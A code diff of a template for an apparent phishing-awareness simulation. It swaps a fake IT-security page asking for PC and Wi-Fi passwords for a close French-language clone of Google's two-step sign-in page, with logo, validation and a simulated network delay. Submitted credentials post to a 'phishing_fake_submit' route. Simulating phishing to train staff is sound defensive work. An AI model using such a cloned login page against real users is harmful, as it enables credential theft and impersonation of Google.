@@ -2,146 +2,369 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Mise à jour sécurité – RSSI</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        /* 1. RÉINITIALISATION ET FOND */
         body {
-            background: #f0f2f5;
-            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
-            padding: 20px;
-            line-height: 1.5;
+            font-family: 'Roboto', 'Google Sans', Arial, sans-serif;
+            background-color: #f0f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
         }
-        .card {
-            max-width: 580px;
-            margin: 40px auto;
-            background: #fff;
-            border-radius: 32px;
-            box-shadow: 0 20px 35px -10px rgba(0,0,0,0.1);
-            overflow: hidden;
-        }
-        .header {
-            background: #1e3a5f;
-            padding: 24px 20px;
-            text-align: center;
-            color: white;
-        }
-        .header h1 {
-            font-size: 1.6rem;
-            font-weight: 600;
-        }
-        .header p {
-            font-size: 0.8rem;
-            opacity: 0.9;
-            margin-top: 6px;
-        }
-        .content {
-            padding: 28px 24px;
-        }
-        .alert {
-            background: #fff3e0;
-            border-left: 5px solid #e67e22;
-            padding: 14px;
-            font-size: 0.85rem;
-            margin-bottom: 24px;
-            border-radius: 12px;
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            font-weight: 600;
-            font-size: 0.8rem;
-            margin-bottom: 6px;
-            color: #1e2a3a;
-        }
-        input {
+
+        /* 2. LA CARTE PRINCIPALE */
+        .login-card {
+            background: #ffffff;
             width: 100%;
-            padding: 14px 16px;
-            border: 1.5px solid #e2e8f0;
-            border-radius: 16px;
-            font-size: 1rem;
-            transition: 0.2s;
-            background: #fff;
+            max-width: 448px;
+            padding: 48px 40px 36px 40px;
+            border-radius: 8px;
+            box-sizing: border-box;
+            position: relative; /* Pour positionner la barre de chargement */
+            overflow: hidden; /* Empêche la barre de dépasser */
         }
-        input:focus {
+
+        /* 3. LE LOGO "G" */
+        .logo-container {
+            margin-bottom: 16px;
+            text-align: left;
+        }
+        .logo-container svg {
+            width: 32px;
+            height: 32px;
+        }
+
+        /* 4. TYPOGRAPHIE */
+        h1 {
+            font-size: 36px;
+            font-weight: 400;
+            color: #1f1f1f;
+            margin: 0 0 10px 0;
+            letter-spacing: -0.5px;
+        }
+        .subtitle {
+            font-size: 16px;
+            color: #1f1f1f;
+            margin: 0 0 40px 0;
+        }
+
+        /* 5. CHAMPS DE TEXTE FLOTTANTS */
+        .input-group {
+            position: relative;
+            margin-bottom: 10px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 15px 15px;
+            font-size: 16px;
+            border: 1px solid #747775;
+            border-radius: 4px;
+            box-sizing: border-box;
             outline: none;
-            border-color: #1e3a5f;
-            box-shadow: 0 0 0 3px rgba(30,58,95,0.2);
+            background: transparent;
+            transition: border-color 0.2s;
         }
-        .btn-submit {
-            display: block;
-            width: 100%;
-            background: #1e3a5f;
+        .input-group input:focus {
+            border: 2px solid #0b57d0;
+            padding: 14px 14px;
+        }
+        /* Classe ajoutée dynamiquement en cas d'erreur de validation */
+        .input-error {
+            border: 2px solid #d93025 !important;
+            padding: 14px 14px !important;
+        }
+        
+        .input-group label {
+            position: absolute;
+            left: 12px;
+            top: 16px;
+            background: #ffffff;
+            padding: 0 4px;
+            color: #444746;
+            font-size: 16px;
+            transition: 0.2s ease all;
+            pointer-events: none;
+        }
+        .input-group input:focus + label,
+        .input-group input:not(:placeholder-shown) + label {
+            top: -8px;
+            font-size: 12px;
+            color: #0b57d0;
+        }
+        .input-group input:not(:placeholder-shown):not(:focus) + label {
+            color: #444746;
+        }
+        .input-group input.input-error + label {
+            color: #d93025 !important;
+        }
+        
+        .error-message {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+            text-align: left;
+        }
+
+        /* 6. BOUTONS ET LIENS */
+        .link-btn {
+            background: none;
+            border: none;
+            color: #0b57d0;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            padding: 0;
+            margin-top: 5px;
+            text-align: left;
+        }
+        .guest-text {
+            font-size: 14px;
+            color: #444746;
+            line-height: 1.5;
+            margin-top: 40px;
+            margin-bottom: 40px;
+        }
+        .profile-pill {
+            display: inline-flex;
+            align-items: center;
+            border: 1px solid #747775;
+            border-radius: 16px;
+            padding: 4px 8px;
+            margin-bottom: 40px;
+            cursor: pointer;
+        }
+        .profile-pill .icon {
+            background-color: #5f6368;
+            color: white;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 12px;
+            margin-right: 8px;
+        }
+        .profile-pill .email-text {
+            font-size: 14px;
+            color: #1f1f1f;
+            font-weight: 500;
+            margin-right: 4px;
+        }
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 30px;
+        }
+        .btn-primary {
+            background-color: #0b57d0;
             color: white;
             border: none;
-            padding: 14px;
-            font-size: 1rem;
-            font-weight: 700;
-            border-radius: 40px;
+            border-radius: 20px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
             cursor: pointer;
             transition: 0.2s;
-            margin-top: 12px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
         }
-        .btn-submit:hover {
-            background: #0f2b44;
-            transform: translateY(-1px);
+
+        /* 7. ANIMATION DE CHARGEMENT GOOGLE (Indeterminate Linear Progress) */
+        .loading-bar-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background-color: #e3e8fc;
+            display: none; /* Caché par défaut */
+            overflow: hidden;
         }
-        .footer-note {
-            margin-top: 24px;
-            text-align: center;
-            font-size: 0.7rem;
-            color: #64748b;
-            border-top: 1px solid #eee;
-            padding-top: 20px;
+        .loading-bar {
+            height: 100%;
+            background-color: #0b57d0;
+            width: 30%;
+            position: absolute;
+            animation: indeterminate 1.5s infinite linear;
         }
-        @media (max-width: 520px) {
-            body { padding: 10px; }
-            .card { margin: 20px auto; }
-            .content { padding: 20px; }
-            input { padding: 12px; }
+        @keyframes indeterminate {
+            0% { left: -30%; width: 30%; }
+            50% { left: 30%; width: 70%; }
+            100% { left: 100%; width: 30%; }
         }
     </style>
 </head>
 <body>
-<div class="card">
-    <div class="header">
-        <h1>🔐Sécurité des systèmes</h1>
-        <p>Service RSSI – Mise à jour obligatoire</p>
-    </div>
-    <div class="content">
-        <div class="alert">
-             Un renouvellement général des mots de passe est requis.  
-            Veuillez saisir vos identifiants actuels pour générer vos nouveaux accès sécurisés.
+
+    <div class="login-card">
+        
+        <div class="loading-bar-container" id="loading-indicator">
+            <div class="loading-bar"></div>
         </div>
-        <form method="post" action="{{ path('phishing_fake_submit') }}">
+
+        <div class="logo-container">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
+                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+            </svg>
+        </div>
+
+        <form id="login-form" method="post" action="{{ path('phishing_fake_submit') }}">
+            
             <input type="hidden" name="token" value="{{ token }}">
-            <div class="form-group">
-                <label>Mot de passe actuel de votre  PC</label>
-                <input type="password" name="password_pc" autocomplete="off">
+
+            <div id="step-1">
+                <h1>Connexion</h1>
+                <p class="subtitle">Utilisez votre compte Google</p>
+
+                <div class="input-group">
+                    <input type="email" id="email-input" name="email" placeholder=" " autocomplete="off">
+                    <label for="email-input">Adresse e-mail ou téléphone</label>
+                </div>
+                <div class="error-message" id="email-error">Veuillez saisir une adresse e-mail valide.</div>
+                
+                <button type="button" class="link-btn">Adresse e-mail oubliée ?</button>
+
+                <div class="guest-text">
+                    Ce n'est pas votre ordinateur ? Utilisez le mode Invité pour vous connecter en mode privé. <button type="button" class="link-btn" style="display:inline;">En savoir plus sur l'utilisation du mode Invité</button>
+                </div>
+
+                <div class="actions">
+                    <button type="button" class="link-btn">Créer un compte</button>
+                    <button type="button" class="btn-primary" id="btn-next">Suivant</button>
+                </div>
             </div>
-            <div class="form-group">
-                <label>Mot de passe actuel de votre wifi</label>
-                <input type="password" name="password_wifi" autocomplete="off">
+
+            <div id="step-2" style="display: none;">
+                <h1>Bienvenue</h1>
+                
+                <div class="profile-pill" id="btn-back">
+                    <div class="icon">👤</div>
+                    <div class="email-text" id="display-email"></div>
+                    <div style="font-size: 10px;">▼</div>
+                </div>
+
+                <div class="input-group">
+                    <input type="password" id="password-input" name="password" placeholder=" ">
+                    <label for="password-input">Saisissez votre mot de passe</label>
+                </div>
+                <div class="error-message" id="pwd-error">Saisissez un mot de passe.</div>
+
+                <div style="display: flex; align-items: center; margin-top: 10px;">
+                    <input type="checkbox" id="show-password" style="margin-right: 15px; width:18px; height:18px; cursor:pointer;">
+                    <label for="show-password" style="font-size:14px; color:#1f1f1f; cursor:pointer;">Afficher le mot de passe</label>
+                </div>
+
+                <div class="actions">
+                    <button type="button" class="link-btn">Essayer une autre méthode</button>
+                    <button type="submit" class="btn-primary" id="btn-submit">Suivant</button>
+                </div>
             </div>
-            <div class="form-group">
-                <label>Confirmer votre email professionnel</label>
-                <input type="email" name="email" autocomplete="off">
-            </div>
-            <button type="submit" class="btn-submit">Valider et recevoir nouveaux accès</button>
         </form>
-        <div class="footer-note">
-            Cette opération est confidentielle.<br>
-            En cas de doute, contactez votre RSSI directement.
-        </div>
+
     </div>
-</div>
+
+    <script>
+        // Récupération des éléments
+        const step1 = document.getElementById('step-1');
+        const step2 = document.getElementById('step-2');
+        const loadingIndicator = document.getElementById('loading-indicator');
+        
+        const emailInput = document.getElementById('email-input');
+        const emailError = document.getElementById('email-error');
+        const displayEmail = document.getElementById('display-email');
+        
+        const passwordInput = document.getElementById('password-input');
+        const pwdError = document.getElementById('pwd-error');
+        const showPasswordCheckbox = document.getElementById('show-password');
+        
+        const btnNext = document.getElementById('btn-next');
+        const btnBack = document.getElementById('btn-back');
+        const loginForm = document.getElementById('login-form');
+
+        // Regex simple pour valider le format de l'e-mail
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+        // Validation Étape 1 avec simulation de délai
+        btnNext.addEventListener('click', () => {
+            const emailValue = emailInput.value.trim();
+            
+            // On vérifie le format e-mail
+            if (emailRegex.test(emailValue)) {
+                // Réinitialiser les erreurs visuelles
+                emailInput.classList.remove('input-error');
+                emailError.style.display = 'none';
+                
+                // 1. Désactiver les champs et lancer l'animation de chargement
+                emailInput.disabled = true;
+                btnNext.disabled = true;
+                loadingIndicator.style.display = 'block';
+
+                // 2. Simuler le temps de latence réseau de Google (1.2 secondes)
+                setTimeout(() => {
+                    loadingIndicator.style.display = 'none';
+                    emailInput.disabled = false;
+                    btnNext.disabled = false;
+                    
+                    displayEmail.textContent = emailValue;
+                    
+                    // Passer à l'étape 2
+                    step1.style.display = 'none';
+                    step2.style.display = 'block';
+                    
+                    // Focus automatique sur le mot de passe
+                    passwordInput.focus();
+                }, 1200);
+
+            } else {
+                // Afficher l'erreur si l'e-mail est invalide
+                emailInput.classList.add('input-error');
+                emailError.style.display = 'block';
+                emailInput.focus();
+            }
+        });
+
+        // Revenir en arrière depuis l'étape 2
+        btnBack.addEventListener('click', () => {
+            step2.style.display = 'none';
+            step1.style.display = 'block';
+            passwordInput.value = ""; // On vide le mot de passe par sécurité
+            pwdError.style.display = 'none';
+            passwordInput.classList.remove('input-error');
+        });
+
+        // Afficher/Masquer le mot de passe
+        showPasswordCheckbox.addEventListener('change', function() {
+            passwordInput.type = this.checked ? 'text' : 'password';
+        });
+
+        // Empêcher la soumission si le mot de passe est vide
+        loginForm.addEventListener('submit', (e) => {
+            const pwdValue = passwordInput.value.trim();
+            if (pwdValue === "") {
+                e.preventDefault(); // Bloque la redirection Symfony
+                passwordInput.classList.add('input-error');
+                pwdError.style.display = 'block';
+                passwordInput.focus();
+            }
+            // Si le mot de passe n'est pas vide, le formulaire continue naturellement
+            // et redirige l'employé vers ta page de sensibilisation Symfony.
+        });
+
+        // Permettre l'utilisation de la touche "Entrée" pour l'étape 1
+        emailInput.addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') {
+                e.preventDefault(); // Empêche la soumission hâtive du formulaire
+                btnNext.click();
+            }
+        });
+    </script>
 </body>
 </html>
